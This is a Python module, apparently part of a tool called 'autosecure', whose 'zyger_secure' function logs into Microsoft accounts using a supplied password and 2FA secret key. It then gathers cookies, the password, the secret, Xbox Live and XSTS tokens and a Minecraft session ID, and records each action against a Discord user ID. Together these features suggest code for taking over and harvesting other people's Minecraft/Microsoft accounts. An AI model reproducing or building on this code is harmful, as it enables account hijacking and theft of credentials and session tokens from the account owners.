"""Zyger secure flow using password and secret key."""

from __future__ import annotations

from typing import Any

from autosecure.core.exceptions import (
    AutoSecureError,
    InvalidCredentials,
    RateLimited,
)
from autosecure.core.logging import get_logger
from autosecure.services.microsoft.auth import MicrosoftAuth
from autosecure.services.securing.otp import SecureResult

log = get_logger("securing.zyger")


async def zyger_secure(
    email: str,
    password: str,
    secret_key: str,
    username: str | None = None,
    user_id: str | None = None,
    db: Any = None,
) -> SecureResult:
    """Secure an account using password and secret key.

    Performs login with password plus secret key for initial authentication,
    then extracts account data and performs post-login actions.

    Args:
        email: Microsoft account email address.
        password: The account password.
        secret_key: The account secret key for 2FA.
        username: Optional known Minecraft username.
        user_id: Optional Discord user ID for tracking.
        db: Optional async database session.

    Returns:
        SecureResult with account data on success or error details.
    """
    log.info("zyger_secure.start", email=email, user_id=user_id)

    try:
        auth = MicrosoftAuth()
        await auth.get_login_data()

        result = await auth.login_with_password(email, password)

        if not result.success and result.error_code == "otp_required":
            result = await auth.login_with_otp(email, secret_key, password=password)

        if not result.success:
            log.warning("zyger_secure.login_failed", email=email, error=result.error)
            return SecureResult(
                success=False,
                error=result.error or "Login failed",
                method="zyger",
            )

        account_data = await _extract_account_data(
            email=email,
            cookies=result.cookies or {},
            access_token=result.access_token,
            username=username,
            password=password,
            secret_key=secret_key,
        )

        if user_id and db:
            await _log_audit(user_id, "zyger_secure", account_data, True, db)

        log.info(
            "zyger_secure.success",
            email=email,
            username=account_data.get("username"),
        )
        return SecureResult(
            success=True,
            account_data=account_data,
            method="zyger",
        )

    except InvalidCredentials as e:
        log.warning("zyger_secure.invalid_credentials", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="zyger")
    except RateLimited as e:
        log.warning("zyger_secure.rate_limited", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="zyger")
    except AutoSecureError as e:
        log.error("zyger_secure.error", email=email, error=str(e))
        return SecureResult(success=False, error=str(e), method="zyger")
    except Exception as e:
        log.error("zyger_secure.unexpected_error", email=email, error=str(e))
        return SecureResult(success=False, error=f"Unexpected error: {e}", method="zyger")


async def _extract_account_data(
    email: str,
    cookies: dict[str, str],
    access_token: str | None,
    username: str | None = None,
    password: str | None = None,
    secret_key: str | None = None,
) -> dict[str, Any]:
    """Extract account information from Zyger login session.

    Args:
        email: Account email.
        cookies: Session cookies from login.
        access_token: Xbox Live access token.
        username: Optional known username.
        password: Account password.
        secret_key: Account secret key.

    Returns:
        Dictionary with account details.
    """
    from autosecure.services.minecraft.auth import get_ssid, get_xsts_token, xbl_login

    account_data: dict[str, Any] = {
        "email": email,
        "username": username,
        "cookies": cookies,
        "password": password,
        "secret_key": secret_key,
    }

    if access_token:
        xbl_result = await xbl_login(email, password or "")
        if xbl_result.success:
            xsts_result = await get_xsts_token(xbl_result.xbl_token)
            if xsts_result.success:
                ssid = await get_ssid(xsts_result.xsts_token)
                account_data["ssid"] = ssid
                account_data["xbl_token"] = xbl_result.xbl_token
                account_data["xsts_token"] = xsts_result.xsts_token

    return account_data


async def _log_audit(
    user_id: str,
    action: str,
    account_data: dict[str, Any],
    success: bool,
    db: Any,
) -> None:
    """Log an audit trail entry.

    Args:
        user_id: Discord user ID.
        action: Action performed.
        account_data: Account data involved.
        success: Whether the action succeeded.
        db: Database session.
    """
    try:
        from autosecure.models.audit import AuditLog

        log_entry = AuditLog(
            actor_id=user_id,
            action=action,
            target_type="account",
            target_id=account_data.get("email"),
            details={"username": account_data.get("username")},
            success=success,
        )
        db.add(log_entry)
        await db.flush()
    except Exception as e:
        log.error("zyger_secure.audit_log_failed", error=str(e))
